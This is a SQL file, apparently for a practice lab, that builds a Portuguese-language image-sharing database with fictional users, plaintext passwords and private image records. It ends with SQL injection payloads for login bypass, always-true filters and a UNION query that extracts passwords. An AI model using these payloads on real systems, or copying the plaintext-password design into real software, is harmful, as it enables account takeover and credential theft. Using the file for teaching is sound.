CREATE TABLE USERS (
	ID SERIAL PRIMARY KEY,
	NAME VARCHAR(250),
	DESCRIPTION TEXT,
	EMAIL VARCHAR(250),
  ROLE VARCHAR(250),
  PRIV BOOLEAN,
  ACTIVE BOOLEAN,
	PASSWORD VARCHAR(250)
);

CREATE TABLE IMAGE (
	ID_IMAGE SERIAL PRIMARY KEY,
  TITLE VARCHAR(250),
	URL_IMAGE TEXT,
	PRIV BOOLEAN,
	ID_USER INT,
	FOREIGN KEY (ID_USER)
		REFERENCES USERS (ID)
);

INSERT INTO USERS VALUES
(DEFAULT, 'Adm', 'Administrador do Sistema',
'adm@email.vale', 'adm', TRUE, TRUE, 'admsenha');

INSERT INTO USERS VALUES
(DEFAULT, 'Gabriel Valentim', 'Adoro esportes e jogar sinuca',
'gabriel@email.vale', 'user', FALSE, TRUE, 'gabrielsenha');

INSERT INTO USERS VALUES
(DEFAULT, 'Eduarda Cortez', 'Apaixonada por vôlei, gosta de beber e dançar. Uma amante da vida',
'eduarda@email.vale', 'user', FALSE, TRUE, 'eduardasenha');

INSERT INTO USERS VALUES
(DEFAULT, 'Yuri Monkend', 'Apaixonado por vôlei, gosta de RPG e fazer programa. Um amante do Carisma',
'YURI@email.vale', 'user', TRUE, TRUE, 'yurisenha');

INSERT INTO USERS VALUES
(DEFAULT, 'Dardo',
'Desenvolvedor de Software Sênior que adora colecionar imagens. Apaixonado por animes e jogos. Atualmente trabalho com as Linguagens de Programação Java e JavaScript.',
'dardo@email.vale', 'user', FALSE, TRUE, 'dardosenha'),
(DEFAULT, 'Bulma Veigar',
'Prazer, eu sou Bulma. Sou amante da tecnologia e do teatro. Estranho? Eu sei, mas eu sou diferente, pois adoro explorar novos conhecimentos e áreas de conhecimento. <3 :* :D',
'bulma@email.vale', 'user', FALSE, TRUE, 'bulmasenha');

INSERT INTO IMAGE VALUES
(DEFAULT, 'Administrador trabalhando', 'https://files.valentim.tech/injection/Man_Office.jpg', TRUE, 1);

INSERT INTO IMAGE VALUES
(DEFAULT, 'Wallpaper PC bonito', 'https://files.valentim.tech/injection/Beauty_PC.jpg', FALSE, 2);

INSERT INTO IMAGE VALUES
(DEFAULT, 'Parque na primavera', 'https://files.valentim.tech/injection/Spring_Park.jpg', FALSE, 3);

INSERT INTO IMAGE VALUES
(DEFAULT, 'Campeões', 'https://files.valentim.tech/injection/Champions.jpg', FALSE, 2),
(DEFAULT, 'Apocalipse', 'https://files.valentim.tech/injection/Desert_City.jpg', FALSE, 2),
(DEFAULT, 'Meu barco no RPG do Yuri', 'https://files.valentim.tech/injection/Vikings.jpg', FALSE, 2),
(DEFAULT, 'Trabalhando!', 'https://files.valentim.tech/injection/Woman-Office.jpg', FALSE, 3),
(DEFAULT, 'Meu lindo relógio', 'https://files.valentim.tech/injection/Clock.jpg', FALSE, 4),
(DEFAULT, 'O carro do pai', 'https://files.valentim.tech/injection/Fast_Car.jpg', FALSE, 4),
(DEFAULT, 'Meu colega de equipe', 'https://files.valentim.tech/injection/Code_Man.jpg', FALSE, 5),
(DEFAULT, 'Camarim', 'https://files.valentim.tech/injection/Camarim.jpg', FALSE, 6),
(DEFAULT, 'Estou estudando muito!', 'https://files.valentim.tech/injection/Woman_Books.jpg', FALSE, 6);

INSERT INTO IMAGE VALUES
(DEFAULT, 'Lembrança do meu pai', 'https://files.valentim.tech/injection/Trucks.jpg', TRUE, 2),
(DEFAULT, 'Dia relaxante', 'https://files.valentim.tech/injection/Yoga.jpg', TRUE, 3),
(DEFAULT, 'Foto secreta do carro do chefe', 'https://files.valentim.tech/injection/Old_Car.jpg', TRUE, 4),
(DEFAULT, 'Maior prazer', 'https://files.valentim.tech/injection/Drink.jpg', TRUE, 5),
(DEFAULT, 'I Love You', 'https://files.valentim.tech/injection/Drawer_Man.jpg', TRUE, 6),
(DEFAULT, 'Minha duplinha', 'https://files.valentim.tech/injection/Man_Circus.jpg', TRUE, 6),
(DEFAULT, 'Esse dia eu arrazei!!!', 'https://files.valentim.tech/injection/Woman_Circus.jpg', TRUE, 6),
(DEFAULT, 'Tô linda <3', 'https://files.valentim.tech/injection/Woman_Semi.jpg', TRUE, 6);


/* Login ignorando a senha */

adm@email.vale'--


'/* Buscar todos os usuários sem filtro */

pesquisa' or '1' = '1'--


'/* Buscar o campo senha em outro campo */

adm' UNION ALL SELECT id, name, password as description FROM users --


'/* Buscar todas as imagens sem filtro */

pesquisa' or '1' = '1'--


'/* Visualizar todas as imagens de um usuário */

pesquisa' OR (SELECT EMAIL FROM USERS WHERE ID = ID_USER) = 'gabriel@email.vale' --
'
pesquisa' OR (SELECT ID FROM USERS WHERE ID = ID_USER) = 1 --

'/**/